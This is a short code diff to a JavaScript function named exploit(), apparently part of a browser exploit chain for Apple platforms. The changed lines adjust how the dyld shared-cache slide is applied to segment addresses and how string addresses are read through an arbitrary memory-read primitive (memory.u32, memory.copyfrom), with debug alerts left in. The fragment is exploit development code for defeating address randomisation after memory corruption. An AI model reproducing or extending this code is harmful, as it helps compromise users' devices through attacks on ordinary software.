@@ -648,7 +648,7 @@ function exploit(){
         alert("cache slide" + cache_slide);
         //base_seg.addr = Add(base_seg.addr, cache_slide
 
-        for(var i = 0; i < nsegs; ++i)
+        for(var i = 0; i < segs.length; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
         }
@@ -703,10 +703,10 @@ function exploit(){
         
             var m = i * 0x20;
             alert(memory.u32(Add(Add(imgs,m),0x18)))
-            var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                var g = memory.copyfrom(Add(straddr, i),0,50);
+                var g = memory.copyfrom(Add(straddr, i),0,1);
                 alert("g"+g)
                 //alert("g[0]"+g[0])
                 return g;
